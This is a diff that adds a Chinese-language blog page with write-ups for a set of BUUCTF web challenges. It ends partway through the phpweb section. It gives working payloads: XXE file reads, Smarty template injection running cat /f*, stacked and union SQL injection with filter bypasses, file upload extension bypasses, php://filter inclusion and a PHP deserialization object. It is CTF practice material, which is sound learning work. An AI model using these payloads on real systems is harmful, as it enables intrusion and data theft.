@@ -1,0 +1,933 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BUUCTF 上做过的 Web 题合集：SQL、XXE、RCE、文件上传与反序列化。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF Web 题解合集">
+<meta property="og:url" content="https://xendr1a.github.io/2026/03/20/buu/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="BUUCTF 上做过的 Web 题合集：SQL、XXE、RCE、文件上传与反序列化。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xendr1a.github.io/img/buu/img-01.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/buu/img-02.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/buu/img-03.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/buu/img-04.png">
+<meta property="article:published_time" content="2026-03-20T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:35.026Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xendr1a.github.io/img/buu/img-01.png">
+  
+  
+  
+  <title>BUUCTF Web 题解合集 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">BUUCTF Web 题解合集</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-20 10:00" pubdate>
+          2026年3月20日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF Web 题解合集</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="BUU-XXE-COURSE-1"><a href="#BUU-XXE-COURSE-1" class="headerlink" title="BUU XXE COURSE 1"></a>BUU XXE COURSE 1</h2><p>先随便填什么，发现没啥玩意，然后F12查看一下有什么东西</p>
+<p><img src="/img/buu/img-01.png" alt="45711984-960c-4979-810d-eb49a451da33-20250226223853-vcquha9"></p>
+<p>由<code>XMLFunction()</code>可以查找到有关的漏洞xxe</p>
+<p>遇事不决，抓包解决</p>
+<p><img src="/img/buu/img-02.png" alt="47982e2665d64c946fba3be5f303335c-20250226224030-y0nxs9z"></p>
+<p>符合xxe漏洞,说明存在XXE-XML漏洞</p>
+<p>payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;#XML声明：标准头部，定义版本和编码。<br>&lt;!DOCTYPE root[<br>&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;<br>]<br>&lt;root&gt;/*DOCTYPE定义：声明一个名为admin的外部实体，指向URI file:///flag（服务器本地的/flag文件）。*/<br>  &lt;username&gt;&amp;admin;&lt;/username&gt;#实体引用：&amp;admin;会将file:///flag文件内容动态替换到&lt;username&gt;标签中。<br>  &lt;password&gt;123456&lt;/password&gt;<br>&lt;/root&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/buu/img-03.png" alt="311eca87-0a97-40f5-a84f-c9ffc5bba9d0-20250226225102-cmmhqo6"></p>
+<h2 id="Upload-Labs-Linux"><a href="#Upload-Labs-Linux" class="headerlink" title="Upload-Labs-Linux"></a>Upload-Labs-Linux</h2><p><strong>一和二</strong></p>
+<p>抓包修改后缀，后蚁剑连接</p>
+<p><strong>三</strong></p>
+<p>改.php2  .php3</p>
+<p><strong>四</strong></p>
+<p>用.htaccess文件</p>
+<p>.htaccess文件解析漏洞</p>
+<p>即可以将所有的文件解析成php文件进行运行</p>
+<p>大佬的理解：不让带熟食进去吃，就带原料进去做好了再吃</p>
+<p><strong>五</strong></p>
+<p>后缀大小写绕过</p>
+<p><strong>六</strong></p>
+<p>空格绕过 ，文件名前加空格</p>
+<p><strong>七</strong></p>
+<p>所有可以解析的后缀都被限制了，只能构造特殊后缀，可以看到空格也被过滤了，但是用了strrchr函数查找点号最后一次出现，所以可以构造.php.为后缀，进行绕过（win系统会自动去除点号，liunx则不会，但点号最后为非法</p>
+<p><strong>八</strong></p>
+<p>和上一题对比少了 <code>::$DATA</code></p>
+<p><strong>在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉</strong></p>
+<p>.php <code>::$DATA</code></p>
+<p><strong>九</strong></p>
+<p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p>
+<p><code>.php. .</code></p>
+<p><strong>十</strong></p>
+<p><code>$file_name = str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name);</code></p>
+<p><code>str_ireplace</code> 函数，它的功能是替换字符串中的子串，并且不区分大小写。</p>
+<p>简单来说这个代码就是把黑名单的东西匹配为空字符，可以试试双写绕过</p>
+<p><code>.pphphp</code></p>
+<p><strong>十一</strong></p>
+<p>嘶，根本弄不进去，看wp是get00截断，（但是我还是弄不进去。</p>
+<p>00截断：<br>当 PHP 在处理文件名或路径时，如果遇到 URL 编码的 %00，它会被解释为一个空字节（ASCII 值为 0）。在php5.3以前，PHP 会将这个空字节转换为 \000 的形式。</p>
+<p>而恰恰在php5.3以前，文件名出现\0000,会导致文件名被截断，只保留%00之前的部分。</p>
+<p>这是因为php语言的底层是c语言，而\0在c语言中是字符串的结束符，所以导致00截断的发生</p>
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>观察只发现了一个注入点&#x2F;index.php?category&#x3D;</p>
+<p>Woofers和Meowers，我们可以考虑伪协议</p>
+<p><img src="/img/buu/img-04.png" alt="7aa7cfcd-9932-4044-b9a9-1abb3b27c84a-20250527193822-4zo4r7k"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>				$file = $_GET[&#x27;category&#x27;];<br><br>				if(isset($file))<br>				&#123;<br>					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;<br>						include ($file . &#x27;.php&#x27;);<br>					&#125;<br>					else&#123;<br>						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;<br>					&#125;<br>				&#125;<br>				?&gt;<br>就是说要包含woofers或者meowers才能读取（第一次见到原来还能这样来过滤<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">php://filter/read=convert.base64-encode/woofers/resource=flag  #注意加上woofers就ok了<br></code></pre></td></tr></table></figure>
+
+<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>看给的应该是说XXF和ip的关系</p>
+<p>然后我们看到最下面的smarty查了一下是个模板，那估计是模板注入了</p>
+<p>他说了与XXF有关那我们就加个</p>
+<p>X-Forwarded-For：{7*7}      发现id：49</p>
+<p>然后我们试试{system(“cat &#x2F;f*”)}</p>
+<p>得到flag</p>
+<h2 id="GYCTF2020-Blacklist1"><a href="#GYCTF2020-Blacklist1" class="headerlink" title="[GYCTF2020]Blacklist1"></a>[GYCTF2020]Blacklist1</h2><p>查1’发现显示</p>
+<p>过滤了好多东西，看了大佬的wp可以使用堆叠注入</p>
+<p>试试show tables和show databases，发现FlagHere,(查数据库是一个伏笔</p>
+<p>slelect因为被过滤了，所以使用handler命令</p>
+<p>挨个用库试试,最后试到supersqli，下面就是语句了</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">?inject=<span class="hljs-number">1</span>&#x27;;                   <span class="hljs-comment">-- 闭合原查询并结束语句</span><br><span class="hljs-keyword">use</span> supersqli;                <span class="hljs-comment">-- 切换到数据库 `supersqli`</span><br>HANDLER FlagHere <span class="hljs-keyword">OPEN</span>;        <span class="hljs-comment">-- 打开表 `FlagHere` 的句柄</span><br>HANDLER FlagHere READ FIRST;  <span class="hljs-comment">-- 读取表的第一行数据</span><br>HANDLER FlagHere CLOSE;       <span class="hljs-comment">-- 关闭句柄</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>完整拼接后的SQL</strong>（假设原查询为<code>SELECT * FROM table WHERE id=&#39;用户输入&#39;</code>）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">SELECT * FROM table WHERE id=&#x27;1&#x27;;<br>USE supersqli;<br>HANDLER FlagHere OPEN;<br>HANDLER FlagHere READ FIRST;<br>HANDLER FlagHere CLOSE;<br></code></pre></td></tr></table></figure>
+
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>找到calc.php查看发现源码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(!isset($_GET[&#x27;num&#x27;]))&#123;<br>    show_source(__FILE__);<br>&#125;else&#123;<br>        $str = $_GET[&#x27;num&#x27;];<br>        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;[&#x27;, &#x27;]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];<br>        foreach ($blacklist as $blackitem) &#123;<br>                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;<br>                        die(&quot;what are you want to do?&quot;);<br>                &#125;<br>        &#125;<br>        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们来看看代码，emmm不能出现num，然后后面过滤了一堆</p>
+<p>首先我们得绕过num的判断，php在解析字符串时，会删除空格，已经把一些非法变量名改为下划线（只改一次）；</p>
+<p>那我们就可以在num前面加个空格来绕过<code> ? num=</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了$blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;[&#x27;, &#x27;]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];这些<br></code></pre></td></tr></table></figure>
+
+<p>然后试了一下system发现没回显，用var_dump有回显</p>
+<p>那我们可以尝试构造命令了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">? num=var_dump(scandir(chr(47))) //先查一下目录,找到了f1agg<br>? num=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //查看得到flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="SUCTF-2019-EasySQL（sql-mode-的利用）"><a href="#SUCTF-2019-EasySQL（sql-mode-的利用）" class="headerlink" title="[SUCTF 2019] EasySQL（sql_mode 的利用）"></a>[SUCTF 2019] EasySQL（sql_mode 的利用）</h2><p>利用了sql_mode：</p>
+<p>sql_mode是一组语法校验规则，个人理解是它可以设定一些sql的语法规则，常见的几个sql_mode如下：</p>
+<table>
+<thead>
+<tr>
+<th>sql_mode的值</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ONLY_FULL_GROUP_BY</td>
+<td>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中</td>
+</tr>
+<tr>
+<td>NO_ZERO_DATE</td>
+<td>mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告</td>
+</tr>
+<tr>
+<td>ERROR_FOR_DIVISION_BY_ZERO</td>
+<td>在insert或update过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时Mysql返回NULL</td>
+</tr>
+<tr>
+<td>PIPES_AS_CONCAT</td>
+<td>将 &#96;</td>
+</tr>
+<tr>
+<td>ANSI_QUOTES</td>
+<td>不能用双引号来引用字符串，因为它被解释为识别符</td>
+</tr>
+</tbody></table>
+<p>那么我们将sql_mode的值设为PIPES_AS_CONCAT时，后端查询语句就相当于：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select concat($_POST[&#x27;query&#x27;],flag) from flag<br></code></pre></td></tr></table></figure>
+
+<p>那么构造payload如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">1;set sql_mode=PIPES_AS_CONCAT;select 1<br></code></pre></td></tr></table></figure>
+
+<p>其中1可以换成任意数字</p>
+<p>这个构造会使得后端语句变成这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">select 1;<br>set sql_mode=PIPES_AS_CONCAT;<br>select concat(1,flag) from flag;<br></code></pre></td></tr></table></figure>
+
+<p>为了方便查看我将这段分为三行，实际上他们处在同一行，因为第一行的分号将语句分隔了，所以我们在第三行要补上一个select</p>
+<p>同时需要注意，这里写concat只是方便理解，实际上它还是 1||flag，只是 || 这是并不是 或，而是用作字符串连接</p>
+<p>最终得到flag：（将1去掉即可）</p>
+<h2 id="SWPU2019-Web11"><a href="#SWPU2019-Web11" class="headerlink" title="[SWPU2019]Web11"></a>[SWPU2019]Web11</h2><p>先注册，再登入</p>
+<p>然后在广告那里发现注入点</p>
+<p>经测试发现过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">空格,or，#，+，-，and,information_schema,注释可以引号闭合，order by可以用group by，<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">查回显-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;<br>查个表-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22<br>构造-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22<br></code></pre></td></tr></table></figure>
+
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">首先进入界面的是<br>&lt;?php  <br>$text = $_GET[&quot;text&quot;];<br>$file = $_GET[&quot;file&quot;];<br>$password = $_GET[&quot;password&quot;];<br>if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;<br>    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;<br>    if(preg_match(&quot;/flag/&quot;,$file))&#123;<br>        echo &quot;Not now!&quot;;<br>        exit(); <br>    &#125;else&#123;<br>        include($file);  //useless.php<br>        $password = unserialize($password);<br>        echo $password;<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>解读一下，先是要让text&#x3D;&#x3D;welcome to the zjctf<br>然后file不能读取flag，但应该可以伪协议一下<br>再看到最后的unserialize说明存在一个需要我们序列化的操作<br>file_get_contents — 将整个文件读入一个字符串，说明我们要让其写入进去就不能简单的赋值，可以采用data:&#x2F;&#x2F;text&#x2F;plain</p>
+<p>就是<code>?text=data://text/plain,welcome to the zjctf</code></p>
+<p>然后就是关于file这个点给了个useless.php，直接写上去没用，那我们这里直接用伪协议读出来了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<br>解码一下是<br>&lt;?php  <br><br>class Flag&#123;  //flag.php  <br>    public $file;  <br>    public function __tostring()&#123;  <br>        if(isset($this-&gt;file))&#123;  <br>            echo file_get_contents($this-&gt;file); <br>            echo &quot;&lt;br&gt;&quot;;<br>        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);<br>        &#125;  <br>    &#125;  <br>&#125;  <br>?&gt; 是我们意料之中的序列化，存在着一个password<br>include($file);  //useless.php<br>        $password = unserialize($password);<br>        echo $password;<br>所以就是直接就是写<br><br>&lt;?php  <br><br>class Flag&#123;  //flag.php  <br>    public $file=&quot;flag.php&quot;;   <br>&#125;  <br>$a=new Flag();<br>echo serialize($a);<br>?&gt; 查看源代码获得flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>发现回暖自动刷新</p>
+<p>抓包发现两个参数func和p</p>
+<p>猜一下这个应该是有东西的，应该是前面为函数后面为值</p>
+<p>system应该是被ban了但是highlight_file没ban</p>
+<p>func&#x3D;highlight_file&amp;p&#x3D;index.php</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>    $disable_fun = 